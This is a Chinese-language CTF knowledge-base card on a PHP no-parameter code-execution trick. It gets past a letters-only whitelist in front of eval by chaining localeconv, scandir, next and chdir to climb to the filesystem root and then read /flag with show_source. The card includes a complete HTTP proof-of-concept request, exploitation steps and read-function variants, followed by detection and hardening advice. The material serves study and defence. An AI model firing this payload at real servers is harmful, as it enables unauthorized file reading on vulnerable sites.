---
id: web-php-rce-no-param-localeconv-scandir-chdir
title: PHP 无参 RCE：localeconv+scandir+next+chdir 逐级上跳并用 show_source 读文件
type: scenario
domain: web
path: web/php/rce
technique: php-no-param-localeconv-chdir
tags:
- php
- rce
- no-parameter
- regex-bypass
- localeconv
- scandir
- chdir
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V12
  verified_at: '2026-11-05T01:33:34+08:00'
  notes: 已对照原文与图11-13核对：白名单正则 ^[A-Za-z\(\)_;]+$、print_r(scandir(current(localeconv()))) 列目录、10 次 chdir(next(scandir(current(localeconv())))) 上跳、show_source(flag) 读 /flag 均与原文一致；图13 显示根目录列表与 flag。卡片对 PHP 8 未定义常量行为的边界说明准确。PoC 未在本机执行。
url: /docs/web/php/rce/web-php-rce-no-param-localeconv-scandir-chdir/
draft: false
kb_aliases:
- localeconv 无参 RCE
- scandir next chdir 上跳
- 无引号无数字 RCE
- show_source(flag) 读文件
- 白名单字母括号分号绕过
---

## 一句话结论

当 `eval` 前的白名单只允许字母、括号、下划线和分号（没有引号、数字、点、斜杠）时，可用 `current(localeconv())` 得到字符串 `.`，用 `next(scandir(...))` 得到 `..` 并交给 `chdir()` 反复上跳，最后 `show_source(flag)` 读取根目录文件，全程不含被禁字符。

## 原理

- `localeconv()` 返回本地化数字格式数组，其第一个元素 `decimal_point` 通常是字符串 `.`；`current(localeconv())` 直接取出这个字符串，充当“当前目录”。
- `scandir(".")` 返回目录项数组，前两个固定是 `.` 和 `..`，按字母序 `..` 排在 `.` 之后；`next(scandir(...))` 把内部指针移到第二个元素并返回 `..`。
- `chdir("..")` 切换到父目录。把 `chdir(next(scandir(current(localeconv()))))` 重复 N 次，就能从 Web 根目录逐级上跳到 `/`。
- 到达根目录后，`show_source(flag)` 中的 `flag` 是未定义常量；PHP 7 会把它当作字符串 `"flag"` 处理（只发 Warning），从而读取 `/flag` 并高亮输出。`print_r(scandir(current(localeconv())))` 可先列目录确认位置。
- 整个 payload 只由函数名（字母/下划线）、括号和分号组成，完全符合 `^[A-Za-z\(\)_;]+$`；校验只限制“语法字符”，没有限制可调用的内建函数组合，因此能构造出文件系统操作。
- 该构造依赖 `disable_functions` 未禁用 `scandir`/`chdir`/`show_source`，且执行目录在文件系统内可逐级上跳。

## 触发条件

- 存在 `eval($_GET[...])` 等动态求值入口；
- 求值前用只允许字母、括号、下划线、分号的弱白名单（如 `preg_match('/^[A-Za-z\(\)_;]+$/', $code)`）；
- `localeconv`、`scandir`、`next`、`current`、`chdir`、`show_source` 等函数未被 `disable_functions` 禁用；
- 进程对目标文件有读权限，且 `open_basedir` 未限制到无法上跳。

## 利用步骤

1. 先提交 `print_r(scandir(current(localeconv())));` 确认当前目录内容与函数可用性。
2. 估算从当前目录到根目录的层级，重复 `chdir(next(scandir(current(localeconv()))))`；不确定时多写几次（到根后继续 `chdir('..')` 仍停在根）。
3. 提交 `print_r(scandir(current(localeconv())));` 确认已到 `/`，能看到 `flag`。
4. 用 `show_source(flag);`（或 `highlight_file(flag)`）读取并回显文件内容。
5. 若 `flag` 文件名不同或需读其他文件，可先用 `print_r(scandir(...))` 枚举，再用未定义常量形式传入文件名。

## PoC

```http
GET /?code=chdir(next(scandir(current(localeconv()))));chdir(next(scandir(current(localeconv()))));chdir(next(scandir(current(localeconv()))));chdir(next(scandir(current(localeconv()))));chdir(next(scandir(current(localeconv()))));chdir(next(scandir(current(localeconv()))));chdir(next(scandir(current(localeconv()))));chdir(next(scandir(current(localeconv()))));chdir(next(scandir(current(localeconv()))));chdir(next(scandir(current(localeconv()))));print_r(scandir(current(localeconv())));show_source(flag); HTTP/1.1
Host: target
```

等价简化：把上跳次数按实际目录深度调整；到根后 `chdir` 不会报错。

成功标志：响应中出现 `Array ( [0] => . [1] => .. [2] => ... [7] => flag ... )` 与 flag 内容。

## 变体与关联

- 变体：用 `getcwd()`、`dirname()`、`glob()`、`get_defined_vars()` 等其他无参函数构造字符串或目录。
- 变体：读取函数可换 `highlight_file`、`readfile`、`file_get_contents`（若被禁用则换 `show_source`）。
- 变体：如果 PHP 8 对未定义常量抛 `Error`，需改用其他能返回文件名的无参函数，或找允许字符串字面量的入口。
- 关联：[[web-php-rce-no-param-get-defined-vars]]（同为无参 RCE，但通过 `get_defined_vars` 取外部参数，不依赖目录上跳）。
- 边界：`open_basedir` 限制、`disable_functions` 覆盖关键函数、或白名单禁止 `_`/分号时，本链不成立。

## 检测与防御

- 检测：请求参数中出现 `localeconv()`、`scandir()`、`chdir()`、`next()` 等无参函数长链；同一参数反复调用 `chdir`。
- 检测：进程出现异常的连续父目录访问，或读取 `/flag` 等敏感文件。
- 防御：不要对用户输入使用 `eval`；若无法避免，改用 AST 解析与函数白名单，而不是字符白名单。
- 加固：`disable_functions` 覆盖 `scandir`、`chdir`、`show_source`、`readfile` 等；设置 `open_basedir` 限定到 Web 目录；降低 Web 进程权限。
